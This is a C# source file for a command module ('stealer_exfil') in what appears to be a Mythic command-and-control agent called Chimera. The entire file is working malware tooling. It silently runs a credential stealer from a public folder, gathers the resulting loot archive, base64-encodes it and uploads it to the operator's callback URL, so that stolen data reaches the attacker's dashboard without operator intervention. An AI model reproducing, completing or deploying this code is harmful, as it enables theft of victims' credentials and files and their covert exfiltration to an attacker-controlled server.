using System;
using System.IO;
using System.Net;
using System.Text;
using Newtonsoft.Json;

namespace Chimera.Commands
{
    // StealerExfil — runs stealer.exe, waits for it to finish,
    // then auto-uploads the loot zip to Mythic so it appears in
    // "Recently Downloaded Files" without operator intervention.
    public class StealerExfil : BaseCommand
    {
        public override string Name => "stealer_exfil";

        // Loot zip drop path — stealer.exe must save here
        private static readonly string LootDir  = @"C:\Users\Public\loot";
        private static readonly string StealerExePath = @"C:\Users\Public\stealer.exe";

        public override MythicTaskResponse Execute(MythicTask task)
        {
            try
            {
                // 1 — Make sure loot dir exists
                Directory.CreateDirectory(LootDir);

                // 2 — Run stealer.exe, wait up to 60s
                var psi = new System.Diagnostics.ProcessStartInfo
                {
                    FileName        = StealerExePath,
                    WindowStyle     = System.Diagnostics.ProcessWindowStyle.Hidden,
                    CreateNoWindow  = true,
                    UseShellExecute = false
                };
                var proc = System.Diagnostics.Process.Start(psi);
                if (proc != null) proc.WaitForExit(60000);

                // 3 — Find the zip stealer dropped
                string[] zips = Directory.GetFiles(LootDir, "*.zip");
                if (zips.Length == 0)
                {
                    // also check for any file in loot dir
                    zips = Directory.GetFiles(LootDir);
                }
                if (zips.Length == 0)
                    return new MythicTaskResponse(task.ID, "stealer ran but no loot files found in " + LootDir, true);

                // 4 — Upload each file to Mythic via chunked download response
                var results = new StringBuilder();
                foreach (string lootFile in zips)
                {
                    string fname  = Path.GetFileName(lootFile);
                    byte[] data   = File.ReadAllBytes(lootFile);
                    string b64    = Convert.ToBase64String(data);

                    // Mythic download message — agent posts this and Mythic stores it
                    // under Recently Downloaded Files on the dashboard
                    var downloadMsg = new
                    {
                        action       = "post_response",
                        responses    = new[]
                        {
                            new
                            {
                                task_id     = task.ID,
                                download    = new
                                {
                                    total_chunks  = 1,
                                    chunk_num     = 1,
                                    chunk_data    = b64,
                                    full_path     = lootFile,
                                    is_screenshot = false
                                }
                            }
                        }
                    };

                    string json = JsonConvert.SerializeObject(downloadMsg);
                    PostToMythic(json);
                    results.AppendLine("uploaded: " + fname + " (" + data.Length / 1024 + " KB)");
                }

                return new MythicTaskResponse(task.ID, results.ToString().Trim(), true);
            }
            catch (Exception ex)
            {
                return new MythicTaskResponse(task.ID, "error: " + ex.Message, true);
            }
        }

        private static void PostToMythic(string json)
        {
            byte[] body = Encoding.UTF8.GetBytes(json);
            var wc = new WebClient();
            wc.Headers[HttpRequestHeader.ContentType] = "application/json";
            wc.Headers["User-Agent"] = Config.UserAgent;
            wc.UploadData(Config.CallbackURL, "POST", body);
        }
    }
}
